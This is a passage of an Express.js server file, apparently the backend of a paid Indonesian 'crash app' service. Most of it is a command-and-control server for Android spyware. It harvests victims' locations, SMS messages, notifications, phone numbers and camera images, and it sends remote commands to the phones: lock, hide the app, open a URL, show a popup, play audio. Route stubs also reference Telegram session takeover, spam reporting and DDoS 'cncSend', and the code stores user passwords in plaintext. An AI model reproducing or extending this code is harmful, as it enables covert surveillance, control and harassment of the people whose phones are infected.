  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  if (editor.role === "reseller" && targetUser.role !== "member") {
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync(LOG_FILE, logLine);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync(LOG_FILE, "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

app.get("/app/version", (req, res) => {
  res.json({
    version: "0.0.0",
    apk_url: "http://roxxnxzahra.hostingvvip.web.id:3311/app/Doyang_Crash_App_release.apk",
    force_update: false,
    changelog: [
      "Auto update APK",
      "UI Update Page baru",
      "Fix bug login"
    ]
  });
});

app.get("/roles", (req, res) => {

  const roles = [
    {
      name: "member",
      days: {
        "30": 10000,
        "999": 30000
      },
      keuntungan: 2000
    },
    {
      name: "reseller",
      days: {
        "30": 50000,
        "999": 120000
      },
      keuntungan: 10000
    },
    {
      name: "owner",
      days: {
        "30": 150000,
        "999": 300000
      },
      keuntungan: 30000
    }
  ];

  res.json({ status: true, data: roles });

});

app.post("/createTransaction", async (req, res) => {

  const { user_id, password, role, days } = req.body;  // <-- ambil password

  const roleConfig = {
    member: { 30: 10000, 999: 30000 },
    reseller: { 30: 50000, 999: 120000 },
    owner: { 30: 150000, 999: 300000 }
  };

  if (!roleConfig[role] || !roleConfig[role][days]) {
    return res.json({ status: false, message: "Role atau durasi tidak valid" });
  }

  const harga = roleConfig[role][days];
  const reff = "ROLE-" + Math.random().toString(36).substring(7);

  const depositData = qs.stringify({
    api_key: API_ATLANTICH,
    reff_id: reff,
    nominal: harga,
    type: 'ewallet',
    metode: 'qris'
  });

  const response = await axios.post(
    'https://atlantich2h.com/deposit/create',
    depositData,
    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
  );

  if (!response.data.status) {
    return res.json({ status: false });
  }

  const info = response.data.data;

  db.transaksi.push({
    user_id,
    password, // <-- simpan password di transaksi sementara
    role,
    days: parseInt(days),
    harga,
    id: info.id,
    status: "pending"
  });

  saveDb();

  res.json({
    status: true,
    qr: info.qr_string,
    id: info.id
  });

});

app.post("/checkTransaction", async (req, res) => {

  const { id } = req.body;

  const trx = db.transaksi.find(t => t.id == id);
  if (!trx) return res.json({ status: false });

  const check = await axios.post(
    'https://atlantich2h.com/deposit/status',
    qs.stringify({
      api_key: API_ATLANTICH,
      id: id
    }),
    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
  );

  if (check.data.data.status == "success") {

  if (trx.status === "success") {
    return res.json({ status: true, paid: true });
  }

  trx.status = "success";

  const username = trx.user_id;

  if (!db.users[username]) {
    db.users[username] = {
      username: username,
      password: trx.password
    };
  }

  db.users[username].role = trx.role;

  const expired = new Date();
  expired.setDate(expired.getDate() + trx.days);

  db.users[username].expiredDate =
    expired.toISOString().split("T")[0];

  // key untuk reseller & owner
  if (["reseller", "owner"].includes(trx.role)) {

    const newKey = generateKey();

    db.activeKeys[newKey] = {
      username: username,
      expired: Date.now() + (365 * 24 * 60 * 60 * 1000)
    };

    saveDb();

    return res.json({
      status: true,
      paid: true,
      role: trx.role,
      key: newKey
    });
  }

  saveDb();

  return res.json({
    status: true,
    paid: true,
    role: trx.role
  });
}

  res.json({ status: true, paid: false });

});

app.use("/app", express.static("public"));

//spyware commander
const DEVICE_DATA = path.join(__dirname, 'database', 'spyware');
if (!fs.existsSync(DEVICE_DATA)) {
    fs.mkdirSync(DEVICE_DATA, { recursive: true });
}

function getDevicePath(username, deviceId) {
    const userDir = path.join(DEVICE_DATA, username);
    if (!fs.existsSync(userDir)) {
        fs.mkdirSync(userDir, { recursive: true });
    }
    return path.join(userDir, deviceId);
}

app.get('/notification', (req, res) => {
    const notif = {
        show: true,
        message: "Server akan maintenance jam 02:00 WIB",
        type: "warning"
    };

    res.json(notif);
});

app.get('/api/my-devices', (req, res) => {
    try {
        const username = req.query.username;
        if (!username) {
            return res.json({ success: false, error: 'Username required' });
        }
        
        const userPath = path.join(DEVICE_DATA, username);
        const devices = [];
        let totalNotifications = 0;
        let onlineCount = 0;
        let activeCommands = 0;
        
        if (fs.existsSync(userPath)) {
            const deviceDirs = fs.readdirSync(userPath).filter(f => {
                const p = path.join(userPath, f);
                return fs.statSync(p).isDirectory();
            });
            
            deviceDirs.forEach(deviceId => {
                const devicePath = path.join(userPath, deviceId);
                const infoPath = path.join(devicePath, 'info.json');
                const locationPath = path.join(devicePath, 'location.json');
                const notifPath = path.join(devicePath, 'notifications.json');
                
                let deviceInfo = {
                    device_id: deviceId,
                    username: username,
                    online: clients.has(deviceId) && clients.get(deviceId).readyState === WebSocket.OPEN
                };
                
                if (fs.existsSync(infoPath)) {
                    try {
                        const info = JSON.parse(fs.readFileSync(infoPath));
                        deviceInfo = { ...deviceInfo, ...info };
                    } catch (e) {}
                }
                
                if (fs.existsSync(locationPath)) {
                    try {
                        const locations = JSON.parse(fs.readFileSync(locationPath));
                        if (locations.length > 0) {
                            deviceInfo.last_location = locations[locations.length - 1];
                        }
                    } catch (e) {}
                }
                
                if (fs.existsSync(notifPath)) {
                    try {
                        const notifications = JSON.parse(fs.readFileSync(notifPath));
                        totalNotifications += notifications.length;
                    } catch (e) {}
                }
                
                if (deviceInfo.online) {
                    onlineCount++;
                    activeCommands++;
                }
                
                devices.push(deviceInfo);
            });
        }
        
        res.json({
            success: true,
            total: devices.length,
            online: onlineCount,
            notifications: totalNotifications,
            activeCommands: activeCommands,
            devices: devices
        });
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});

app.get('/api/devices', (req, res) => {
    try {
        const users = fs.readdirSync(DEVICE_DATA).filter(f => {
            const p = path.join(DEVICE_DATA, f);
            return fs.statSync(p).isDirectory();
        });
        
        const devices = [];
        let totalNotifications = 0;
        let onlineCount = 0;
        
        users.forEach(username => {
            const userPath = path.join(DEVICE_DATA, username);
            const deviceDirs = fs.readdirSync(userPath).filter(f => {
                const p = path.join(userPath, f);
                return fs.statSync(p).isDirectory();
            });
            
            deviceDirs.forEach(deviceId => {
                const devicePath = path.join(userPath, deviceId);
                const infoPath = path.join(devicePath, 'info.json');
                const locationPath = path.join(devicePath, 'location.json');
                const notifPath = path.join(devicePath, 'notifications.json');
                
                let deviceInfo = {
                    device_id: deviceId,
                    username: username,
                    online: clients.has(deviceId) && clients.get(deviceId).readyState === WebSocket.OPEN
                };
                
                if (fs.existsSync(infoPath)) {
                    try {
                        const info = JSON.parse(fs.readFileSync(infoPath));
                        deviceInfo = { ...deviceInfo, ...info };
                    } catch (e) {}
                }
                
                if (fs.existsSync(locationPath)) {
                    try {
                        const locations = JSON.parse(fs.readFileSync(locationPath));
                        if (locations.length > 0) {
                            deviceInfo.last_location = locations[locations.length - 1];
                        }
                    } catch (e) {}
                }
                
                if (fs.existsSync(notifPath)) {
                    try {
                        const notifications = JSON.parse(fs.readFileSync(notifPath));
                        totalNotifications += notifications.length;
                    } catch (e) {}
                }
                
                if (deviceInfo.online) {
                    onlineCount++;
                }
                
                devices.push(deviceInfo);
            });
        });
        
        res.json({
            success: true,
            total: devices.length,
            online: onlineCount,
            notifications: totalNotifications,
            commands: clients.size,
            devices: devices
        });
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});

app.get('/api/device/:username/:deviceId', (req, res) => {
    const { username, deviceId } = req.params;
    const devicePath = getDevicePath(username, deviceId);
    
    if (!fs.existsSync(devicePath)) {
        return res.json({ success: false, error: 'Device not found' });
    }
    
    try {
        const infoPath = path.join(devicePath, 'info.json');
        const locationPath = path.join(devicePath, 'location.json');
        const notifPath = path.join(devicePath, 'notifications.json');
        const imagesPath = path.join(devicePath, 'images');
        
        const deviceInfo = {
            device_id: deviceId,
            username: username,
            online: clients.has(deviceId) && clients.get(deviceId).readyState === WebSocket.OPEN
        };
        
        if (fs.existsSync(infoPath)) {
            try {
                const info = JSON.parse(fs.readFileSync(infoPath));
                Object.assign(deviceInfo, info);
            } catch (e) {}
        }
        
        if (fs.existsSync(locationPath)) {
            try {
                const locations = JSON.parse(fs.readFileSync(locationPath));
                deviceInfo.locations = locations.slice(-20);
                if (locations.length > 0) {
                    deviceInfo.last_location = locations[locations.length - 1];
                }
            } catch (e) {}
        }
        
        if (fs.existsSync(notifPath)) {
            try {
                const notifications = JSON.parse(fs.readFileSync(notifPath));
                deviceInfo.notifications = notifications.slice(-50).reverse();
                deviceInfo.notification_count = notifications.length;
            } catch (e) {}
        }
        
        if (fs.existsSync(imagesPath)) {
            try {
                const images = fs.readdirSync(imagesPath).slice(-5);
                deviceInfo.images = images;
            } catch (e) {}
        }
        
        res.json({ success: true, data: deviceInfo });
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});

app.post('/api/notification', (req, res) => {
    try {
        const data = req.body;
        const deviceId = req.headers['x-device-id'] || data.device_id;
        const username = req.headers['x-username'] || data.username;
        
        if (!deviceId || !username) {
            return res.status(400).json({ success: false, error: 'Missing device info' });
        }
        
        const notifPath = path.join(getDevicePath(username, deviceId), 'notifications.json');
        let notifications = [];
        
        if (fs.existsSync(notifPath)) {
            try {
                notifications = JSON.parse(fs.readFileSync(notifPath));
            } catch (e) {
                notifications = [];
            }
        }
        
        const notificationData = {
            id: Date.now() + Math.random().toString(36).substring(7),
            app: data.app || 'unknown',
            package: data.package || 'unknown',
            title: data.title || '',
            content: data.content || '',
            time: data.time || Date.now(),
            time_formatted: data.time_formatted || new Date().toISOString(),
            received_at: new Date().toISOString(),
            read: false,
            source: 'http'
        };
        
        notifications.push(notificationData);
        
        if (notifications.length > 500) {
            notifications = notifications.slice(-500);
        }
        
        fs.writeFileSync(notifPath, JSON.stringify(notifications, null, 2));
        
        res.json({ success: true, message: 'Notification saved' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

app.get('/api/openweb', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    const url = req.query.url;
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    if (!url) {
        return res.json({ success: false, error: 'Need query url' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'open_web',
        url: url,
        timestamp: Date.now()
    };
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `open_web command sent to ${device}`,
        device,
        command: 'open_web',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/show_notif', (req, res) => {
    const { 
      device, 
      username,
      title,
      message 
    } = req.query;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    if (!title || !message) {
        return res.json({ success: false, error: 'Need title & message' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'show_notification',
        title: title,
        message: message,
        timestamp: Date.now()
    };
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `show_notification command sent to ${device}`,
        device,
        command: 'show_notification',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/show_popup', (req, res) => {
    const { 
      device, 
      username,
      title,
      message 
    } = req.query;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    if (!title || !message) {
        return res.json({ success: false, error: 'Need title & message' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'show_popup',
        title: title,
        message: message,
        timestamp: Date.now()
    };
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `show_popup command sent to ${device}`,
        device,
        command: 'show_popup',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/show_image', (req, res) => {
    const { 
      device, 
      username,
      url,
      count 
    } = req.query;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    if (!url || !count) {
        return res.json({ success: false, error: 'Need url & count' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'show_floating_images',
        url: url,
        count: count,
        timestamp: Date.now()
    };
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `show_floating_images command sent to ${device}`,
        device,
        command: 'show_floating_images',
        status: 'delivered',
        time: new Date().toISOString()
    });
});
app.get('/api/clear_image', (req, res) => {
    const { 
      device, 
      username
    } = req.query;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    const commandData = { 
        type: 'command', 
        command: 'clear_floating_images',
        timestamp: Date.now()
    };
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `clear_floating_images command sent to ${device}`,
        device,
        command: 'clear_floating_images',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/lock', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'lock',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Lock command sent to ${device}`,
        device,
        command: 'lock',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/unlock', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'unlock',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Unlock command sent to ${device}`,
        device,
        command: 'unlock',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/flashlight_on', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'flashlight_on',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Flashlight ON command sent to ${device}`,
        device,
        command: 'flashlight_on',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/flashlight_off', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'flashlight_off',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Flashlight OFF command sent to ${device}`,
        device,
        command: 'flashlight_off',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/music/play', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    const url = req.query.url;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    if (!url) {
        return res.json({ success: false, error: 'URL required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'play_music', 
        url: url,
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Play music command sent to ${device}`,
        device,
        command: 'play_music',
        url: url,
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/music/stop', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'stop_music',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Stop music command sent to ${device}`,
        device,
        command: 'stop_music',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/app/hide', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'hide_app',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Hide app command sent to ${device}`,
        device,
        command: 'hide_app',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/app/show', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'show_app',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Show app command sent to ${device}`,
        device,
        command: 'show_app',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/location/get', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    const limit = req.query.limit ? parseInt(req.query.limit) : 20;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const locationPath = path.join(getDevicePath(username, device), 'location.json');
    
    if (!fs.existsSync(locationPath)) {
        return res.json({ success: true, locations: [], total: 0, message: 'No location data found' });
    }
    
    try {
        const locations = JSON.parse(fs.readFileSync(locationPath));
        const lastLocation = locations.length > 0 ? locations[locations.length - 1] : null;
        
        const client = clients.get(device);
        const isOnline = client && client.readyState === WebSocket.OPEN;
        
        res.json({
            success: true,
            device,
            username,
            locations: locations.slice(-limit).reverse(),
            last_location: lastLocation,
            total: locations.length,
            online: isOnline
        });
    } catch (e) {
        res.json({ success: false, error: 'Error reading location data' });
    }
});

app.get('/api/battery/get', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const infoPath = path.join(getDevicePath(username, device), 'info.json');
    
    if (!fs.existsSync(infoPath)) {
        return res.json({ success: false, error: 'No battery data found' });
    }
    
    try {
        const info = JSON.parse(fs.readFileSync(infoPath));
        
        res.json({
            success: true,
            device,
            username,
            battery: info.battery || 0,
            temperature: info.battery_temperature || 0,
            charging: info.charging || false,
            health: info.battery_health || 'Unknown',
            voltage: info.battery_voltage || 0,
            technology: info.battery_technology || 'Unknown',
            last_seen: info.last_seen
        });
    } catch (e) {
        res.json({ success: false, error: 'Error reading battery data' });
    }
});

app.get('/api/notifications/get', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    const limit = req.query.limit ? parseInt(req.query.limit) : 50;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const notifPath = path.join(getDevicePath(username, device), 'notifications.json');
    
    if (!fs.existsSync(notifPath)) {
        return res.json({ success: true, notifications: [], total: 0, unread: 0 });
    }
    
    try {
        const notifications = JSON.parse(fs.readFileSync(notifPath));
        const unread = notifications.filter(n => !n.read).length;
        
        const client = clients.get(device);
        const isOnline = client && client.readyState === WebSocket.OPEN;
        
        res.json({
            success: true,
            device,
            username,
            notifications: notifications.slice(-limit).reverse(),
            total: notifications.length,
            unread,
            online: isOnline
        });
    } catch (e) {
        res.json({ success: false, error: 'Error reading notifications' });
    }
});

app.get('/api/device/info', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const infoPath = path.join(getDevicePath(username, device), 'info.json');
    
    if (!fs.existsSync(infoPath)) {
        return res.json({ success: false, error: 'Device not found' });
    }
    
    try {
        const info = JSON.parse(fs.readFileSync(infoPath));
        const isOnline = clients.has(device) && clients.get(device).readyState === WebSocket.OPEN;
        
        res.json({
            success: true,
            device,
            username,
            model: info.model || 'Unknown',
            android_version: info.android_version || 'Unknown',
            sdk_version: info.sdk_version || 0,
            manufacturer: info.manufacturer || 'Unknown',
            brand: info.brand || 'Unknown',
            phone_number: info.phone_number || 'Unknown',
            sim_operator: info.sim_operator || 'Unknown',
            battery: info.battery || 0,
            temperature: info.battery_temperature || 0,
            charging: info.charging || false,
            first_seen: info.first_seen,
            last_seen: info.last_seen,
            status: isOnline ? 'online' : 'offline'
        });
    } catch (e) {
        res.json({ success: false, error: 'Error reading device info' });
    }
});

app.get('/telegram/login', ToolsController.initiateUnifiedTelegramLogin);
app.get('/telegram/auth', ToolsController.submitTelegramAuth);
app.get('/telegram/status', ToolsController.checkLoginStatus);
app.post('/telegram/verify-password', ToolsController.verifySessionPassword);
app.get('/telegram/sessions', ToolsController.getTelegramSessions);
app.get('/telegram/delete-session', ToolsController.removeTeleSes);
app.get('/telegram/refresh-sessions', ToolsController.refreshTelegramSessions);
app.post('/telegram/spam-report', ToolsController.startSpamReport);
app.get('/telegram/report-status', ToolsController.getSpamReportStatus);
app.get("/myServer", VPSController.getMyServer);
app.post("/addServer", VPSController.addServer);
app.post("/delServer", VPSController.deleteServer);
app.post("/sendCommand", VPSController.sendCommand);
app.get("/cncSend", VPSController.cncSend);

app.get('/api/latest_updates', (req, res) => {
  res.status(200).json([
    {
      id: 1,
      title: "RAT ( BETA ) DAN DDOS",
      image: "https://gangalink.vercel.app/i/uikktbl6.jpg",
      time: "just now",
      is_new: true,
      link: "https://yourdomain.com/news/1"
    },
    {
      id: 2,
      title: "NEW DASHBOARD UI",
      image: "https://gangalink.vercel.app/i/uikktbl6.jpg",
      time: "5 min ago",
      is_new: true,
      link: "https://yourdomain.com/news/2"
    },
    {
      id: 3,
      title: "SERVER PERFORMANCE IMPROVED",
      image: "https://gangalink.vercel.app/i/uikktbl6.jpg",
      time: "1 hour ago",
      is_new: false,
      link: "https://yourdomain.com/news/3"
    }
  ]);
});

app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ extended: true, limit: '500mb' }));

wss.on('connection', (ws) => {
 console.log("WebSocket CONNECTED!");
    let currentDevice = null;
    let currentUsername = null;
    let pingInterval = null;
    
    ws.on('message', (data) => {
    console.log("RAW MASUK:", data.toString());
        try {
            const msg = JSON.parse(data.toString());
            
            if (msg.type === 'auth') {
                currentUsername = msg.username;
                currentDevice = msg.device_id;
                
                console.log(`Device connected: ${currentDevice} (${msg.model})`);
                
                const devicePath = getDevicePath(currentUsername, currentDevice);
                if (!fs.existsSync(devicePath)) {
                    fs.mkdirSync(devicePath, { recursive: true });
                }
                
                clients.set(currentDevice, ws);
                
                const infoPath = path.join(devicePath, 'info.json');
                let info = {};
                
                if (fs.existsSync(infoPath)) {
                    try {
                        info = JSON.parse(fs.readFileSync(infoPath));
                    } catch (e) {}
                }
                
                info.device_id = currentDevice;
                info.username = currentUsername;
                info.model = msg.model;
                info.battery = msg.battery || 0;
                info.last_seen = new Date().toISOString();
                info.first_seen = info.first_seen || new Date().toISOString();
                
                fs.writeFileSync(infoPath, JSON.stringify(info, null, 2));
                
                ws.send(JSON.stringify({ 
                    type: 'auth_success', 
                    message: 'Authentication successful',
                    timestamp: Date.now() 
                }));
                
                if (pingInterval) clearInterval(pingInterval);
                pingInterval = setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
                    }
                }, 10000);
            }
            
            if (msg.type === 'device_info' && currentUsername && currentDevice) {
                const devicePath = getDevicePath(currentUsername, currentDevice);
                const infoPath = path.join(devicePath, 'info.json');
                let info = {};
                
                if (fs.existsSync(infoPath)) {
                    try {
                        info = JSON.parse(fs.readFileSync(infoPath));
                    } catch (e) {}
                }
                
                Object.assign(info, msg);
                info.last_seen = new Date().toISOString();
                
                fs.writeFileSync(infoPath, JSON.stringify(info, null, 2));
                console.log(`Device info received from ${currentDevice}`);
            }
            
            if (msg.type === 'image' && currentUsername && currentDevice) {
                const devicePath = getDevicePath(currentUsername, currentDevice);
                const imagesPath = path.join(devicePath, 'images');
                
                if (!fs.existsSync(imagesPath)) {
                    fs.mkdirSync(imagesPath, { recursive: true });
                }
                
                const filename = `${msg.image_type}_${Date.now()}.jpg`;
                const filepath = path.join(imagesPath, filename);
                
                const imageBuffer = Buffer.from(msg.data, 'base64');
                fs.writeFileSync(filepath, imageBuffer);
                
                msg.device_id = currentDevice;
                msg.username = currentUsername;
                
                console.log(`Image received from ${currentDevice}: ${msg.image_type}`);
            }
            
            if (msg.type === 'pong' && currentUsername && currentDevice) {
                const infoPath = path.join(getDevicePath(currentUsername, currentDevice), 'info.json');
                if (fs.existsSync(infoPath)) {
                    try {
                        const info = JSON.parse(fs.readFileSync(infoPath));
                        info.last_seen = new Date().toISOString();
                        fs.writeFileSync(infoPath, JSON.stringify(info, null, 2));
                    } catch (e) {}
                }
            }
            
            if (msg.type === 'location' && currentUsername && currentDevice) {
                const devicePath = getDevicePath(currentUsername, currentDevice);
                const locationPath = path.join(devicePath, 'location.json');
                let locations = [];
                
                if (fs.existsSync(locationPath)) {
                    try {
                        locations = JSON.parse(fs.readFileSync(locationPath));
                    } catch (e) {
                        locations = [];
                    }
                }
                
                const locationData = {
                    lat: msg.lat,
                    lng: msg.lng,
                    accuracy: msg.accuracy || 0,
                    provider: msg.provider || 'unknown',
                    speed: msg.speed || 0,
                    bearing: msg.bearing || 0,
                    altitude: msg.altitude || 0,
                    time: msg.time || Date.now(),
                    time_formatted: msg.time_formatted || new Date().toISOString(),
                    received_at: new Date().toISOString()
                };
                
                locations.push(locationData);
                
                if (locations.length > 200) {
                    locations = locations.slice(-200);
                }
                
                fs.writeFileSync(locationPath, JSON.stringify(locations, null, 2));
                console.log(`Location received from ${currentDevice}: ${msg.lat}, ${msg.lng}`);
            }
            
            if (msg.type === 'battery' && currentUsername && currentDevice) {
                const infoPath = path.join(getDevicePath(currentUsername, currentDevice), 'info.json');
                
                if (fs.existsSync(infoPath)) {
                    try {
                        const info = JSON.parse(fs.readFileSync(infoPath));
                        info.battery = msg.level;
                        info.battery_temperature = msg.temperature || 0;
                        info.charging = msg.charging || false;
                        info.last_seen = new Date().toISOString();
                        
                        fs.writeFileSync(infoPath, JSON.stringify(info, null, 2));
                    } catch (e) {}
                }
            }
            
            if (msg.type === 'notification' && currentUsername && currentDevice) {
                const devicePath = getDevicePath(currentUsername, currentDevice);
                const notifPath = path.join(devicePath, 'notifications.json');
                let notifications = [];
                
                if (fs.existsSync(notifPath)) {
                    try {
                        notifications = JSON.parse(fs.readFileSync(notifPath));
                    } catch (e) {
                        notifications = [];
                    }
                }
                
                const notificationData = {
                    id: Date.now() + Math.random().toString(36).substring(7),
                    app: msg.app || 'unknown',
                    package: msg.package || 'unknown',
                    title: msg.title || '',
                    content: msg.content || '',
                    time: msg.time || Date.now(),
                    time_formatted: msg.time_formatted || new Date().toISOString(),
                    received_at: new Date().toISOString(),
                    read: false
                };
                
                notifications.push(notificationData);
                
                if (notifications.length > 500) {
                    notifications = notifications.slice(-500);
                }
                
                fs.writeFileSync(notifPath, JSON.stringify(notifications, null, 2));
                console.log(`Notification from ${currentDevice}: ${msg.app} - ${msg.title}`);
            }
            
            if (msg.type === 'sms' && currentUsername && currentDevice) {
                const devicePath = getDevicePath(currentUsername, currentDevice);
                const smsPath = path.join(devicePath, 'sms.json');
                let smsList = [];
                
                if (fs.existsSync(smsPath)) {
                    try {
                        smsList = JSON.parse(fs.readFileSync(smsPath));
                    } catch (e) {
                        smsList = [];
                    }
                }
                
                smsList.push(msg);
                
                if (smsList.length > 500) {
                    smsList = smsList.slice(-500);
                }
                
                fs.writeFileSync(smsPath, JSON.stringify(smsList, null, 2));
